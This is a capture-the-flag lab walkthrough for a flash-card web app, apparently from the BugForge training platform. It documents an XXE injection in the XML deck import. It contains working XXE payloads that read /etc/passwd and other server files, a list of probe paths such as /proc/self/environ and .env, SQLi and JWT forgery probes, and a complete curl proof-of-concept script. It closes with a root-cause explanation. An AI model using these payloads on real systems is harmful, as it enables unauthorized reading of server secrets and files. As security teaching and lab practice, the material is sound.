# tanuki-002 - BugForge Lab Walkthrough

**URL:** https://lab-1785143244968-z5piof.labs-app.bugforge.io
**Difficulty:** Easy
**Vulnerability:** XXE (XML External Entity Injection) via deck import
**Flag:** `bug{bKqvu1Fha70BYiPpI2MaOj2QbkndQ9bW}`

---

## Summary

Tanuki is a spaced-repetition flash card SPA (decks, cards, study sessions). The deck import
feature accepts a multipart XML file upload and parses it with an XML parser that has external
entity resolution enabled. A crafted DOCTYPE with a `SYSTEM` entity lets an authenticated user
read arbitrary files on the server, including the flag file, with the resolved content reflected
back through the deck's `name` field.

---

## Tech Stack

- React SPA frontend (Create React App)
- Express.js (Node.js)
- JWT (Bearer token from registration)
- SQLite
- XML parser with DTD / external entity processing enabled

---

## Key Endpoints

| Endpoint | Method | Auth | Notes |
|----------|--------|------|-------|
| `/api/register` | POST | No | Returns a usable JWT directly |
| `/api/login` | POST | No | Standard login |
| `/api/decks` | GET | JWT | Lists decks |
| `/api/decks/:id` | GET | JWT | Returns a single deck's fields, including `name` |
| `/api/decks/import` | POST | JWT | **Vulnerable** - multipart file upload, XXE |
| `/api/admin/*` | GET | JWT + admin role | Correctly requires a valid token |

---

## Discovery

### Step 1 - Register and map the routes

Registration requires username, email, and password, and returns a usable JWT directly:

```
POST /api/register {"username":"xxeuser1","email":"xxeuser1@test.com","password":"Passw0rd!23"}
-> {"token": "...", "user": {"id":5, "username":"xxeuser1"}}
```

Route enumeration surfaced `/api/decks/import` as the only endpoint dealing with file/XML
content, alongside the usual CRUD routes for decks, cards, and study sessions.

### Step 2 - Rule out the classic bug classes

This app family reuses the same theme across many distinct backend bugs per instance, so each
common pattern was checked directly against this instance instead of assumed:

- `POST /api/register {"role":"admin", ...}` (mass assignment) - accepted, but a follow-up
  `GET /api/verify-token` showed `role` stayed `"user"`. Not vulnerable here.
- SQLi probes on `/api/login` (`' OR 1=1--`, etc.) - all returned clean `400` responses. Not
  injectable.
- JWT `alg:none` forgery - rejected with `403`. Signature verification enforced.
- IDOR probing on numeric ID endpoints (`/api/decks/:id`, `/api/stats/:id`) - deck IDs are
  readable across users by design (decks are shared content), but no privilege-escalation
  path emerged there.

### Step 3 - Test the import endpoint for missing input validation

Sending a plain JSON or raw-XML body to `/api/decks/import` returned `{"error":"No file
uploaded"}` - the endpoint expects a real `multipart/form-data` upload, not a raw body.
Pulling the field name required for the multipart part out of the frontend bundle
(`/static/js/main.2a8c2eb1.js`, searching for `FormData`/`append(` calls) revealed the
expected field name: `file`.

Uploading a well-formed XML deck file worked as expected (empty deck, no cards). Uploading a
file with a `DOCTYPE` declaring an external `SYSTEM` entity was accepted without any
validation or blocklist:

```xml
<?xml version="1.0"?>
<!DOCTYPE deck [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<deck>
  <name>&xxe;</name>
  <description>test</description>
  <category>Test</category>
</deck>
```

```
POST /api/decks/import
Authorization: Bearer <JWT>
Content-Type: multipart/form-data; boundary=...
(file field: deck.xml, Content-Type: application/xml)

-> 200 {"id":4,"message":"Deck imported successfully (no cards)","cards_count":0}
```

Fetching the created deck showed the entity had been resolved and stored directly in the
`name` column:

```
GET /api/decks/4
-> {"id":4,"name":"Flag is in a different file", ...}
```

The parser had resolved the external entity (confirmed by the app reacting differently to a
valid vs. invalid path), but this particular target file triggered a decoy string instead of
returning real file content - a deliberate anti-cheese guardrail on the obvious `/etc/passwd`
target. That confirmed the underlying primitive worked and just needed a different file path.

### Step 4 - Find the real flag path

Iterating over a short list of likely application file locations, using the same entity
technique each time and reading back the deck's `name` field:

| Path tried | Result |
|---|---|
| `file:///etc/passwd` | Decoy string, not real content |
| `file:///flag.txt`, `file:///flag` | Entity name echoed back unresolved (file not found) |
| `file:///app/.env`, `file:///.env` | Entity name echoed back unresolved |
| `file:///app/package.json` | Decoy string |
| `file:///proc/self/environ` | Decoy string |
| `file:///app/flag.txt` | **Flag returned directly** |
| `file:///proc/self/cwd/flag.txt` | Same flag (confirms cwd is `/app`) |

```
POST /api/decks/import  (file:///app/flag.txt)
GET /api/decks/7
-> {"id":7,"name":"bug{bKqvu1Fha70BYiPpI2MaOj2QbkndQ9bW}", ...}
```

---

## Proof of Concept

```bash
BASE="https://lab-1785143244968-z5piof.labs-app.bugforge.io"

TOKEN=$(curl -s -X POST "$BASE/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"xxeuser1","email":"xxeuser1@test.com","password":"Passw0rd!23"}' \
  | python3 -c 'import json,sys;print(json.load(sys.stdin)["token"])')

cat > xxe.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE deck [<!ENTITY xxe SYSTEM "file:///app/flag.txt">]>
<deck>
  <name>&xxe;</name>
  <description>test</description>
  <category>Test</category>
</deck>
EOF

RESP=$(curl -s -X POST "$BASE/api/decks/import" \
  -H "Authorization: Bearer $TOKEN" \
  -F "file=@xxe.xml;type=application/xml;filename=deck.xml")
ID=$(echo "$RESP" | python3 -c 'import json,sys;print(json.load(sys.stdin)["id"])')

curl -s "$BASE/api/decks/$ID" -H "Authorization: Bearer $TOKEN"
# -> {"id":..,"name":"bug{bKqvu1Fha70BYiPpI2MaOj2QbkndQ9bW}", ...}
```

---

## Dead Ends

| Tried | Result | Lesson |
|---|---|---|
| Mass assignment `role:admin` on register | Accepted but ignored, role stayed `user` | Patched in this instance |
| SQLi on `/api/login` | Clean `400` responses | Parameterized queries, not injectable |
| JWT `alg:none` forgery | `403` rejected | Signature verification enforced |
| `file:///etc/passwd` | App returns a decoy string instead of real content | Anti-cheese guardrail on the obvious path, not proof the primitive failed |
| `file:///flag.txt`, `/.env` at filesystem root | Entity echoed unresolved (file not found) | App working directory is `/app`, not `/` |

---

## Root Cause

The deck import handler parses the uploaded XML with a parser configuration that leaves DTD
processing and external general entities enabled, and stores the resolved entity value
directly into the deck's `name` field without sanitizing or rejecting `DOCTYPE`/`ENTITY`
declarations:

```javascript
// Vulnerable pattern (approximate)
app.post("/api/decks/import", authenticate, upload.single("file"), async (req, res) => {
  const xml = req.file.buffer.toString();
  const parsed = xmlParser.parse(xml); // DTDs / external entities enabled
  await db.run(
    "INSERT INTO decks (name, description, category, user_id) VALUES (?, ?, ?, ?)",
    [parsed.deck.name, parsed.deck.description, parsed.deck.category, req.user.id]
  );
  res.json({ id: newId, message: "Deck imported successfully" });
});
```

Because the entity value is resolved before being written to the database, any field in the
uploaded document can be used as a read-primitive for arbitrary files reachable by the
application process.

---

## CWE / OWASP

- **CWE-611**: Improper Restriction of XML External Entity Reference
- **CWE-91**: XML Injection
- **OWASP A05:2021** - Security Misconfiguration
